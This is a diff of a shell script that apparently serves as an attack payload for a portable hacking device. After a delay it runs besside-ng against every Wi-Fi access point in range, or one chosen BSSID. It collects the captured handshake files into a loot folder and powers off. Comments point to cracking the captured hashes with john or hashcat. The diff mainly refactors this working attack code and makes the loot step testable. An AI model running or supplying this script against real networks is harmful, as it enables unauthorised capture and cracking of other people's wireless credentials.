@@ -13,50 +13,70 @@
 #   aircrack-ng -J filebase capturefile.cap
 # After that crack the hash using john or hashcat
 
-LED SETUP
 # Short fuse: starting in 5 minutes
 START_IN=300
 # Gather for 2 minutes
 GATHER_FOR=120
 # Leave blank if you want to attack all APs
 TARGET_BSSID=""
+# Where captures are collected to
+LOOT_DIR=/root/loot
+# Directory besside-ng writes besside.log and *.cap to (the filesystem root by
+# default). Overridable so the loot-collection step can be exercised in tests.
+CAP_SRC="${CAP_SRC:-}"
 
-echo "|_  Starting in $START_IN seconds, gathering for $GATHER_FOR seconds"
-if [ -z "$TARGET_BSSID" ]
-then
-  echo "|_  Attack all in range"
-else
-  echo "|_  Attack only $TARGET_BSSID"
-fi
+# Move besside-ng's output into the loot directory. Guards each move so an
+# empty run (no besside.log, no captures) does not error out before poweroff.
+function collect_loot() {
+    mkdir -p "$LOOT_DIR"
+    [ -f "$CAP_SRC/besside.log" ] && mv "$CAP_SRC/besside.log" "$LOOT_DIR"
+    for cap in "$CAP_SRC"/*.cap; do
+        [ -e "$cap" ] || break
+        mv "$cap" "$LOOT_DIR"
+    done
+    return 0
+}
 
-sleep $START_IN
+function run() {
+    LED SETUP
 
-LED ATTACK
+    echo "|_  Starting in $START_IN seconds, gathering for $GATHER_FOR seconds"
+    if [ -z "$TARGET_BSSID" ]
+    then
+      echo "|_  Attack all in range"
+    else
+      echo "|_  Attack only $TARGET_BSSID"
+    fi
 
-echo "[*] Starting attack"
+    sleep "$START_IN"
 
-if [ -z "$TARGET_BSSID" ]
-then
-  echo "[*] Attacking all APs in range..."
-  besside-ng wlan0 &
-  bpid=$!
-else
-  echo "[*] Attacking only $TARGET_BSSID..."
-  besside-ng -b $TARGET_BSSID wlan0 &
-  bpid=$!
-fi
+    LED ATTACK
 
-sleep $GATHER_FOR
+    echo "[*] Starting attack"
 
-echo "[*] Stopping attack"
-kill $bpid
-wait $bpid
+    if [ -z "$TARGET_BSSID" ]
+    then
+      echo "[*] Attacking all APs in range..."
+      besside-ng wlan0 &
+    else
+      echo "[*] Attacking only $TARGET_BSSID..."
+      besside-ng -b "$TARGET_BSSID" wlan0 &
+    fi
+    bpid=$!
 
-mv /besside.log /root/loot
-mv /*.cap /root/loot
-sync
+    sleep "$GATHER_FOR"
 
-LED SUCCESS
+    echo "[*] Stopping attack"
+    kill "$bpid"
+    wait "$bpid"
 
-echo "[*] Shutting down"
-poweroff
+    collect_loot
+    sync
+
+    LED SUCCESS
+
+    echo "[*] Shutting down"
+    poweroff
+}
+
+run
